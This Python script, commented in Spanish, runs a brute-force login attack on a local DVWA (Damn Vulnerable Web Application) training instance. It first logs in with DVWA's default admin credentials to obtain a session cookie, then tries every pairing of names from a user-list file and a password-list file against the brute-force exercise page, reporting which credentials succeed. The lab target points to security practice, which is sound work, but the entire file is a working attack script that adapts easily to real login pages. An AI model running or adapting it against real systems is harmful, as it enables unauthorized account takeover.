import requests

# URL para el login y para la vulnerabilidad de fuerza bruta
login_url = 'http://localhost:8080/login.php'
brute_url = 'http://localhost:8080/vulnerabilities/brute/'

# Archivos de texto con usuarios y contraseñas
users_file = 'userlist.txt'
passwords_file = 'passwordlist.txt'

# Credenciales para el login
login_data = {
    'username': 'admin',  # Usuario con el que te autenticas en DVWA
    'password': 'password',  # Contraseña de este usuario
    'Login': 'Login'
}

# Cabeceras HTTP
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Función para leer archivos de texto
def read_lines(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Función para iniciar sesión y obtener la cookie PHPSESSID
def get_session_cookies():
    session = requests.Session()  # Crea una sesión persistente
    response = session.post(login_url, headers=headers, params=login_data)
    
    if 'Set-Cookie' in response.headers:
        print(f"[INFO] Autenticación exitosa. PHPSESSID obtenido.")
        return session.cookies
    else:
        print(f"[ERROR] Falló la autenticación. No se pudo obtener PHPSESSID.")
        return None

# Función para realizar el ataque de fuerza bruta
def brute_force_attack(cookies):
    users = read_lines(users_file)
    passwords = read_lines(passwords_file)

    for username in users:
        for password in passwords:
            data = {
                'username': username,
                'password': password,
                'Login': 'Login'
            }
            response = requests.post(brute_url, headers=headers, cookies=cookies, params=data)

            if 'Welcome to the password protected area' in response.text:
                print(f'[SUCCESS] Usuario: {username} Contraseña: {password}')
                return
            else:
                print(f'[FAILED] Usuario: {username} Contraseña: {password}')

# Ejecutar el ataque de fuerza bruta
session_cookies = get_session_cookies()
if session_cookies:
    brute_force_attack(session_cookies)
